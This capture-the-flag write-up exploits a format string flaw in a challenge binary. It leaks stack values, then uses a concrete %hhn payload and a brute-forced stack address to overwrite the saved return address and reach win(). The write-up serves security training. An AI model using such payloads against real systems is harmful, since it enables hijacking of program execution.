# Challenge `Return Address Again` writeup

- Vulnerability: What type of vulnerability is being exploited
    - Format String vulnerability combined with stack buffer to achieve arbitrary memory write
- Where: Where is the vulnerability present
    - In the `vuln()` function at line `printf(buffer)`, user input is passed directly to printf without a format specifier
- Impact: What results of exploiting this vulnerability
    - Allows arbitrary memory write, enabling overwrite of the saved return address on the stack to redirect program execution to the `win()` function, bypassing normal control flow and obtaining the flag

## Steps to reproduce

1. Connect to the challenge service
`nc mustard.stt.rnl.tecnico.ulisboa.pt 25198`

2. Send a payload to leak stack values and identify where our input buffer is located
```
AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x
---------------
Output:
AAAA.ffffdc9c.0000007f.0804926a.00000000.00000001.f7ffd918.41414141
```

3. The buffer starts at position #7 (0x41414141 = 'AAAA'). The return address is stored approximately 16 bytes before our buffer.

4. Find the `win()` function address using `objdump`: `0x080491f6`. Verify with `checksec` that PIE is disabled, making addresses predictable.

5. Craft the exploit payload: place 4 consecutive addresses (pointing to the return address location) at positions 7-10, then use `%hhn` to write each byte of `0x080491f6` with calculated padding: `p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3) + "%230c%7$hhn%155c%8$hhn%115c%9$hhn%4c%10$hhn"`.

6. Brute force addresses from `0xffffdcf0` to `0xffffdd10` to find the exact return address location due to minor stack variations.

7. At `0xffffdcfc`, the payload successfully overwrites the return address with `0x080491f6`.

8. When `vuln()` returns, execution jumps to `win()` which prints the flag.

[(POC)](Return_Address_Again.py)
